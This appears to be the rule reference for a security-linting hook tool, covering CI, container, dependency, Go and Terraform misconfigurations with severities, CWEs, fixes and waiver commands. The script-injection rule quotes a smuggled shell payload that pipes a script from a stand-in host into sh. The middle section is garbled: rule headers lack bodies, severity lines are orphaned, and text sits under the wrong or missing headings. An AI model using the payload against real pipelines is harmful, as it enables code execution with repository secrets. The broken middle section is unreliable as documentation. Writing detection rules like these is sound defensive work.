## ci

CI and build pipeline. 8 rules.

### `ci/no-explicit-permissions`

Workflow does not set an explicit permissions block

**medium** / tentative · `P3` · CWE-250 · end of turn

The repository default may be read-write, and it can be changed organization-wide without touching this file. An explicit block makes the grant visible in review and immune to that drift.

**Fix.** Add `permissions: {contents: read}` at the top of the workflow and widen per job where needed.

<sub>Waive: `airtight hooks ignore-value ci/no-explicit-permissions "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line ci/no-explicit-permissions -- <reason>`</sub>

### `ci/pull-request-target-checkout`

pull_request_target checks out untrusted PR code

**critical** / confirmed · `P0` · CWE-829 · A08:2021 · fires on edit

pull_request_target runs with the base repository's secrets and a writable token, unlike pull_request. Checking out the fork's code in that context means any stranger who opens a pull request can execute code with your credentials. This is the single most exploited CI misconfiguration there is.

**Fix.** Use the pull_request trigger instead, or keep pull_request_target but do not check out or execute PR code. If you need both, split into two workflows and pass only inert data between them.

<sub>Waive: `airtight hooks ignore-value ci/pull-request-target-checkout "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line ci/pull-request-target-checkout -- <reason>`</sub>

### `ci/script-injection`

Attacker-controlled context interpolated into a shell

**critical** / firm · `P0` · CWE-94 · A03:2021 · fires on edit

Expressions are substituted into the script before the shell sees it, so a pull request title of `a"; curl evil.sh | sh; #` becomes part of the command. The attacker needs no write access, only the ability to open an issue or a pull request.

**Fix.** Pass the value through an env var and reference it as "$TITLE" inside the script. The shell then treats it as data, never as syntax.

<sub>Waive: `airtight hooks ignore-value ci/script-injection "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line ci/script-injection -- <reason>`</sub>

### `ci/secret-echoed-to-log`

Secret written to the build log

**high** / firm · `P1` · CWE-532 · fires on edit

GitHub masks known secret values in logs, but masking fails on transformed values such as base64 or a substring, and build logs on a public repository are world-readable and archived.

**Fix.** Remove the echo. If you need to confirm a secret is set, test its length rather than printing it.

<sub>Waive: `airtight hooks ignore-value ci/secret-echoed-to-log "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line ci/secret-echoed-to-log -- <reason>`</sub>

### `ci/self-hosted-runner`

Job runs on a self-hosted runner

**medium** / tentative · `P3` · CWE-1188 · end of turn

Self-hosted runners are not ephemeral by default, so one job can leave state, credentials, or a backdoor for the next. On a public repository a fork pull request can reach the runner and therefore your network.

**Fix.** Use ephemeral runners that are destroyed after each job, keep them off the production network, and never enable them for public fork pull requests.

<sub>Waive: `airtight hooks ignore-value ci/self-hosted-runner "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line ci/self-hosted-runner -- <reason>`</sub>

### `ci/unpinned-third-party-action`

Third-party action pinned to a mutable ref

**high** / firm · `P1` · CWE-829 · A08:2021 · fires on edit

A tag or branch can be repointed by whoever owns the repository, at any time and with no notice to you. The next run then executes their new code in a job that holds your secrets and can push to your repository.

**Fix.** Pin to the full 40-character commit SHA, with the human-readable version in a trailing comment. Dependabot updates SHA pins.

<sub>Waive: `airtight hooks ignore-value ci/unpinned-third-party-action "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line ci/unpinned-third-party-action -- <reason>`</sub>

### `ci/workflow-run-checkout`

workflow_run checks out code from the triggering run

**high** / firm · `P1` · CWE-829 · end of turn

workflow_run executes in the base repository context with secrets, and the run that triggered it may have been produced by an untrusted fork. This is pull_request_target's problem wearing a different trigger.

**Fix.** Download and treat artifacts from the triggering run as untrusted data, and do not check out or execute its code.

<sub>Waive: `airtight hooks ignore-value ci/workflow-run-checkout "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line ci/workflow-run-checkout -- <reason>`</sub>

### `ci/write-all-permissions`

Workflow grants write-all permissions

**high** / confirmed · `P1` · CWE-250 · fires on edit

Every step, including every third-party action, inherits a token that can push code, alter releases, and change repository settings. One compromised action is then a full repository takeover rather than a contained incident.

**Fix.** Set `permissions: {contents: read}` at the workflow level and grant individual write scopes only on the jobs that need them.

<sub>Waive: `airtight hooks ignore-value ci/write-all-permissions "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line ci/write-all-permissions -- <reason>`</sub>


## container

Containers. 10 rules.

### `container/add-from-url`

ADD fetches a remote URL

**high** / confirmed · `P1` · CWE-494 · fires on edit

ADD from a URL fetches over the network at build time with no checksum and no signature check, so whoever controls that URL controls what ends up in your image.

**Fix.** Use RUN with curl or wget plus an explicit checksum verification, or vendor the artifact and COPY it.

<sub>Waive: `airtight hooks ignore-value container/add-from-url "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line container/add-from-url -- <reason>`</sub>

### `container/curl-pipe-shell`

Build pipes a downloaded script straight into a shell

**high** / confirmed · `P1` · CWE-494 · A08:2021 · fires on edit

The script is executed unverified, and the server can serve different content to your build than it serves to a human reviewing the URL.

**Fix.** Download to a file, verify a pinned checksum or signature, then execute it.

<sub>Waive: `airtight hooks ignore-value container/curl-pipe-shell "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line container/curl-pipe-shell -- <reason>`</sub>

### `container/explicit-root-user`

Container explicitly switches back to root

**high** / confirmed · `P1` · CWE-250 · fires on edit

Setting USER back to root in the shipping stage undoes the containment, and it usually happens because a runtime step needed a privileged directory that could have been chowned at build time instead.

**Fix.** Chown the paths the process needs at build time, then keep the non-root USER for the runtime stage.

<sub>Waive: `airtight hooks ignore-value container/explicit-root-user "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line container/explicit-root-user -- <reason>`</sub>

### `container/latest-tag`

Base image pinned to a mutable tag

**medium** / firm · `P2` · CWE-1104 · end of turn

The content behind :latest changes without notice, so the image you tested is not necessarily the image you deploy, and a compromised upstream tag reaches you on the next build.

**Fix.** Pin to an explicit version, and ideally to a digest with @sha256.

<sub>Waive: `airtight hooks ignore-value container/latest-tag "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line container/latest-tag -- <reason>`</sub>

### `container/runs-as-root`

Container runs as root

**high** / firm · `P1` · CWE-250 · fires on edit

A container escape or an RCE in the application lands with uid 0 inside the container and on every bind-mounted host path. Dropping to a non-root user is the cheapest meaningful containment this image can have.

**Fix.** Add a non-root USER after installing dependencies and before CMD, for example `USER node` on Node base images or a dedicated uid such as `USER 10001`.

<sub>Waive: `airtight hooks ignore-value container/runs-as-root "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line container/runs-as-root -- <reason>`</sub>

### `container/secret-in-build-arg`

Credential baked into an image layer

**critical** / firm · `P0` · CWE-798 · fires on edit

Layers are content-addressed and shipped whole. A value set here is readable with `docker history` by anyone who can pull the image, and deleting it in a later layer does not remove it.

**Fix.** Use BuildKit secret mounts (`RUN --mount=type=secret`) at build time, or inject the value at runtime from a secret manager.

<sub>Waive: `airtight hooks ignore-value container/secret-in-build-arg "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line container/secret-in-build-arg -- <reason>`</sub>

### `container/ssh-key-copied`

Private key copied into the image

**critical** / firm · `P0` · CWE-798 · fires on edit

Anyone who can pull the image gets the key, and it stays in the layer history even if a later stage deletes the file.

**Fix.** Mount the key at runtime, or use BuildKit SSH forwarding (`RUN --mount=type=ssh`) for build-time access.

<sub>Waive: `airtight hooks ignore-value container/ssh-key-copied "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line container/ssh-key-copied -- <reason>`</sub>

### `container/sudo-in-image`

sudo installed in the image

**medium** / firm · `P2` · CWE-250 · end of turn

A container has no need to escalate: run the process as the user it should be. Installing sudo turns a non-root USER from containment back into a speed bump.

**Fix.** Drop sudo and set the correct USER, chowning any paths the process must write.

<sub>Waive: `airtight hooks ignore-value container/sudo-in-image "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line container/sudo-in-image -- <reason>`</sub>

### `container/unpinned-digest`

Base image not pinned to a digest

**low** / tentative · `P3` · CWE-494 · end of turn

A version tag can be moved by whoever owns the repository. Only a digest makes the build reproducible and makes an upstream tag swap visible.

**Fix.** Resolve the tag to a digest and pin it as image@sha256:..., then update it deliberately.

<sub>Waive: `airtight hooks ignore-value container/unpinned-digest "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line container/unpinned-digest -- <reason>`</sub>

### `container/world-writable-chmod`

Build makes paths world-writable

**medium** / firm · `P2` · CWE-732 · end of turn

World-writable paths let any process in the container, including one an attacker lands, replace application code or configuration.

**Fix.** Grant ownership to the runtime user with `chown` and use 755 or 750 instead. 777 is almost always a workaround for a chown that was missing.

<sub>Waive: `airtight hooks ignore-value container/world-writable-chmod "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line container/world-writable-chmod -- <reason>`</sub>


## dep

Dependencies and supply chain. 12 rules.

### `dep/curl-pipe-shell-script`

Script pipes a download straight into a shell

**high** / confirmed · `P1` · CWE-494 · A08:2021 · fires on edit

The downloaded script is executed unverified, and a server can serve different content to an automated fetch than to a human reading the URL.

**Fix.** Download to a file, verify a pinned checksum or signature, then execute it.

<sub>Waive: `airtight hooks ignore-value dep/curl-pipe-shell-script "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line dep/curl-pipe-shell-script -- <reason>`</sub>

### `dep/git-dependency-unpinned`

Git dependency not pinned to a commit

**high** / firm · `P1` · CWE-829 · A08:2021 · end of turn

Without a commit hash the reference is mutable: a force push to the branch changes what you install, with no version bump and nothing in your diff.

**Fix.** Append the full 40-character commit SHA to the dependency URL, as "#8f4b7c2e1d9a6035fe2cb14d7a09e853b6c1f240".

<sub>Waive: `airtight hooks ignore-value dep/git-dependency-unpinned "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line dep/git-dependency-unpinned -- <reason>`</sub>

### `dep/go-replace-local-path`

Go module replaced with a local path

**medium** / firm · `P2` · CWE-1104 · end of turn

A local replace directive builds from a path that does not exist in CI or on another developer's machine, and it silently bypasses checksum verification for that module.

**Fix.** Remove the replace before merging, or use a Go workspace file which is not committed.

<sub>Waive: `airtight hooks ignore-value dep/go-replace-local-path "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line dep/go-replace-local-path -- <reason>`</sub>

### `dep/http-registry`

Package registry configured over plaintext

**critical** / confirmed · `P0` · CWE-319 · A08:2021 · fires on edit

Anyone on the network path can substitute the package that gets installed, and the installed code runs with the developer's or the build agent's privileges.

**Fix.** Use the HTTPS endpoint of the same registry.

<sub>Waive: `airtight hooks ignore-value dep/http-registry "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line dep/http-registry -- <reason>`</sub>

### `dep/install-script`

Package defines an install lifecycle script

**medium** / firm · `P2` · CWE-829 · A08:2021 · end of turn

Install scripts run automatically on npm install, with the developer's privileges and network access, before any code review of the dependency has happened. They are the standard payload location for a compromised package.

**Fix.** Confirm the script is yours and is necessary. Consider running CI installs with --ignore-scripts and invoking the build step explicitly.

<sub>Waive: `airtight hooks ignore-value dep/install-script "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line dep/install-script -- <reason>`</sub>

### `dep/lockfile-http-resolved`

Lockfile resolves a package over plaintext

**high** / confirmed · `P1` · CWE-319 · A08:2021 · fires on edit

Every install from this lockfile fetches that package over a modifiable channel, and the integrity hash does not help if the attacker can also rewrite the lockfile entry in transit.

**Fix.** Repoint the registry to HTTPS and regenerate the lockfile.

<sub>Waive: `airtight hooks ignore-value dep/lockfile-http-resolved "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line dep/lockfile-http-resolved -- <reason>`</sub>

### `dep/npm-audit-disabled`

Dependency audit turned off

**medium** / confirmed · `P2` · CWE-1104 · end of turn

Disabling audit silences the advisory check for everyone on the project, including the person who would otherwise have caught a newly disclosed vulnerability in a transitive dependency.

**Fix.** Leave audit enabled. If a specific advisory is not applicable, record that decision with an override rather than switching off the whole check.

<sub>Waive: `airtight hooks ignore-value dep/npm-audit-disabled "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line dep/npm-audit-disabled -- <reason>`</sub>

### `dep/npm-auth-token-committed`

Registry auth token in project configuration

**critical** / firm · `P0` · CWE-798 · fires on edit

A publish-scoped token in a committed .npmrc lets anyone with repository read access ship a release of your package to every consumer.

**Fix.** Reference an environment variable with ${NPM_TOKEN} and supply it from CI secrets, then revoke the committed token.

<sub>Waive: `airtight hooks ignore-value dep/npm-auth-token-committed "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line dep/npm-auth-token-committed -- <reason>`</sub>

### `dep/pip-index-http`

pip index served over plaintext

**critical** / confirmed · `P0` · CWE-319 · A08:2021 · fires on edit

Packages are fetched over a channel anyone on the path can modify, and pip executes package build code during install.

**Fix.** Use the HTTPS endpoint of the index.

<sub>Waive: `airtight hooks ignore-value dep/pip-index-http "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line dep/pip-index-http -- <reason>`</sub>

### `dep/pip-trusted-host`

pip configured to skip certificate validation

**critical** / confirmed · `P0` · CWE-295 · A08:2021 · fires on edit

--trusted-host disables TLS verification for that index, so an active network attacker can serve a different package, and pip will execute its setup.py during install.

**Fix.** Fix the certificate chain instead, by installing the internal CA on the build image.

<sub>Waive: `airtight hooks ignore-value dep/pip-trusted-host "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line dep/pip-trusted-host -- <reason>`</sub>

### `dep/pip-unpinned`

Python dependency not pinned

**medium** / firm · `P2` · CWE-1104 · A06:2021 · end of turn

An unpinned requirement resolves to whatever is newest at install time, so the build is not reproducible and a compromised release is picked up immediately.

**Fix.** Pin with == and manage upgrades with pip-tools or a bot, or commit a hash-pinned lock file.

<sub>Waive: `airtight hooks ignore-value dep/pip-unpinned "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line dep/pip-unpinned -- <reason>`</sub>

### `dep/wildcard-version`

Dependency accepts any version

**high** / confirmed · `P1` · CWE-1104 · A06:2021 · fires on edit

Any publish by the maintainer, or by anyone who compromises their account, is installed on the next fresh install. There is no review window and no lockfile guarantee for a new environment.

**Fix.** Pin to a caret or exact range, and let a bot propose upgrades so they pass through review.

<sub>Waive: `airtight hooks ignore-value dep/wildcard-version "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line dep/wildcard-version -- <reason>`</sub>


## go

Go. 19 rules.

### `go/bind-all-interfaces`

Server listening on all network interfaces

**low** / firm · `P3` · CWE-200 · A01:2021 · end of turn

Binding to all network interfaces exposes local internal services or administrative endpoints to the broader network or public Internet.

**Fix.** Bind explicitly to a private internal IP address or 127.0.0.1 for local services.

<sub>Waive: `airtight hooks ignore-value go/bind-all-interfaces "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line go/bind-all-interfaces -- <reason>`</sub>

### `go/command-exec-shell`

Operating system command executed via shell interpreter

**critical** / firm · `P0` · CWE-78 · A03:2021 · fires on edit

Passing dynamic strings to a shell interpreter via -c allows command injection through shell metacharacters. Any unvalidated input can execute arbitrary commands with the privileges of the process.

**Fix.** Invoke the target executable directly with arguments passed as separate slice elements instead of routing through a shell interpreter.

<sub>Waive: `airtight hooks ignore-value go/command-exec-shell "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line go/command-exec-shell -- <reason>`</sub>

### `go/cookie-flags`

Insecure cookie missing HttpOnly or Secure flag

**medium** / confirmed · `P2` · CWE-1004 · A05:2021 · fires on edit

Cookies configured with HttpOnly or Secure set to false can be accessed by client-side scripts via document.cookie during XSS attacks, or transmitted in plaintext over unencrypted HTTP connections where network eavesdroppers can capture session tokens.

**Fix.** Explicitly set HttpOnly: true and Secure: true on all session and authentication cookies in Go services.

<sub>Waive: `airtight hooks ignore-value go/cookie-flags "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line go/cookie-flags -- <reason>`</sub>

### `go/cors-wildcard`

Permissive CORS wildcard origin configuration

**medium** / confirmed · `P2` · CWE-942 · A01:2021 · fires on edit

Permitting all origins allows arbitrary third-party websites to issue cross-origin requests to internal application APIs on behalf of authenticated users.

**Fix.** Explicitly configure allowed origins with a whitelist of trusted domains (e.g., AllowedOrigins: []string{"https://app.example.com"}).

<sub>Waive: `airtight hooks ignore-value go/cors-wildcard "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line go/cors-wildcard -- <reason>`</sub>

### `go/env-exfiltration`

Process environment harvested to network

**critical** / firm · `P0` · CWE-200 · A01:2021 · fires on edit

Dumping and serializing os.Environ() into an outbound network payload leaks all environment variables, including secrets and tokens.

**Fix.** Transmit only specific, required configuration fields rather than serializing the entire os.Environ() slice.

<sub>Waive: `airtight hooks ignore-value go/env-exfiltration "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line go/env-exfiltration -- <reason>`</sub>

### `go/gin-debug-mode`

Gin framework running in debug mode

**low** / firm · `P3` · CWE-200 · A05:2021 · end of turn

Running the Gin web framework in debug mode outputs detailed routing logs, internal handlers, and stack traces that expose internal application structure and file paths to users and observers.

**Fix.** Use gin.SetMode(gin.ReleaseMode) in production deployments and load the active environment from configuration.

<sub>Waive: `airtight hooks ignore-value go/gin-debug-mode "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line go/gin-debug-mode -- <reason>`</sub>

### `go/html-template-unescaped`

Template contextual escaping bypassed with template.HTML or template.JS

**high** / firm · `P1` · CWE-79 · A03:2021 · fires on edit

Go's html/template package automatically escapes data to prevent Cross-Site Scripting (XSS). Converting dynamic user input or request values into template.HTML, template.JS, or template.URL tells the template engine that the string is safe, completely bypassing contextual escaping and allowing malicious script execution.

**Fix.** Pass raw strings directly to the template data context rather than wrapping untrusted values in template.HTML, or sanitize the HTML with a dedicated sanitizer like bluemonday before conversion.

<sub>Waive: `airtight hooks ignore-value go/html-template-unescaped "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line go/html-template-unescaped -- <reason>`</sub>

**high** / confirmed · `P1` · CWE-327 · A02:2021 · fires on edit

### `js/child-process-interpolation`

### `k8s/allow-privilege-escalation`

The process can gain more privileges than its parent through setuid binaries or file capabilities, which turns a limited RCE into a root one inside the container.

**critical** / confirmed · `P0` · CWE-250 · fires on edit

### `k8s/dangerous-capabilities`

**high** / confirmed · `P1` · CWE-250 · fires on edit

SYS_ADMIN is close to privileged in practice, SYS_PTRACE allows inspecting and injecting into other processes, and SYS_MODULE loads kernel modules. Each is a documented escape route.

**Fix.** Drop ALL capabilities and add back only the narrow ones the process needs, such as NET_BIND_SERVICE for a low port.

**critical** / confirmed · `P0` · CWE-250 · fires on edit

**critical** / firm · `P0` · CWE-89 · A03:2021 · fires on edit

**critical** / firm · `P0` · CWE-89 · A03:2021 · fires on edit

Paired with an access key ID this is full API credentials. Secret keys cannot be viewed again after creation, so a leaked one is usually the only copy an attacker needs.

Administrative port open to the internet

SSH, RDP, and database ports reachable from the whole internet are found by mass scanners within minutes of going live, and credential stuffing against them is continuous and automated.

**Fix.** Restrict cidr_blocks to your own ranges, or reach the host through a bastion, SSM Session Manager, or a private endpoint instead.

<sub>Waive: `airtight hooks ignore-value terraform/open-ingress-sensitive-port "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line terraform/open-ingress-sensitive-port -- <reason>`</sub>

### `terraform/rds-publicly-accessible`

Database instance is publicly accessible

**critical** / confirmed · `P0` · CWE-284 · A01:2021 · fires on edit

The database gets a public IP and is reachable from the internet subject only to its security group. Database ports are among the most scanned on the internet.

**Fix.** Set publicly_accessible = false and reach the database from inside the VPC or over a private endpoint.

<sub>Waive: `airtight hooks ignore-value terraform/rds-publicly-accessible "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line terraform/rds-publicly-accessible -- <reason>`</sub>

### `terraform/rds-unencrypted`

Database storage is not encrypted

**high** / confirmed · `P1` · CWE-311 · A02:2021 · end of turn

Snapshots and the underlying volumes are readable by anyone who obtains them, and encryption cannot be enabled in place later without a snapshot and restore.

**Fix.** Set storage_encrypted = true and specify a customer-managed KMS key where policy requires one.

<sub>Waive: `airtight hooks ignore-value terraform/rds-unencrypted "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line terraform/rds-unencrypted -- <reason>`</sub>

### `terraform/s3-public-access-block-disabled`

S3 public access block explicitly disabled

**high** / confirmed · `P1` · CWE-284 · fires on edit

This is the account's backstop against an accidentally public bucket. Turning it off removes the control that catches the mistake everyone eventually makes.

**Fix.** Set block_public_acls, block_public_policy, ignore_public_acls and restrict_public_buckets to true.

<sub>Waive: `airtight hooks ignore-value terraform/s3-public-access-block-disabled "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line terraform/s3-public-access-block-disabled -- <reason>`</sub>

### `terraform/s3-public-acl`

S3 bucket ACL grants public access

**critical** / confirmed · `P0` · CWE-284 · A01:2021 · fires on edit

A public bucket is enumerable by anyone, and public-read-write additionally lets strangers store content you will pay for and be blamed for.

**Fix.** Set the ACL to private and serve public objects through CloudFront with an origin access identity. Enable the account-level public access block too.

<sub>Waive: `airtight hooks ignore-value terraform/s3-public-acl "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line terraform/s3-public-acl -- <reason>`</sub>

### `terraform/sqs-sns-public-policy`

Queue or topic policy allows any principal

**high** / firm · `P1` · CWE-284 · end of turn

Any AWS account, and often any anonymous caller, can invoke the allowed actions. On a queue that means message injection or drainage; on a bucket it means public data.

**Fix.** Name the specific principals, and add a condition on aws:SourceAccount or aws:SourceArn.

<sub>Waive: `airtight hooks ignore-value terraform/sqs-sns-public-policy "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line terraform/sqs-sns-public-policy -- <reason>`</sub>

### `terraform/unencrypted-state-backend`

Remote state backend not encrypted

**high** / confirmed · `P1` · CWE-311 · end of turn

Terraform state contains every value the configuration touched, including generated passwords and keys, in plaintext. It is frequently the most sensitive object in the account.

**Fix.** Set encrypt = true, add a kms_key_id, and enable versioning plus a lock table on the state bucket.

<sub>Waive: `airtight hooks ignore-value terraform/unencrypted-state-backend "<value>" --reason "<who decided: evidence>"`, or inline: `airtight-disable-next-line terraform/unencrypted-state-backend -- <reason>`</sub>

### `terraform/weak-tls-policy`

Load balancer accepts obsolete TLS

**medium** / confirmed · `P2` · CWE-327 · A02:2021 · end of turn

TLS 1.0 and 1.1 are deprecated, fail PCI-DSS, and carry cipher suites with practical downgrade attacks.

**Fix.** Use a TLS 1.2 or 1.3 policy such as ELBSecurityPolicy-TLS13-1-2-2021-06.
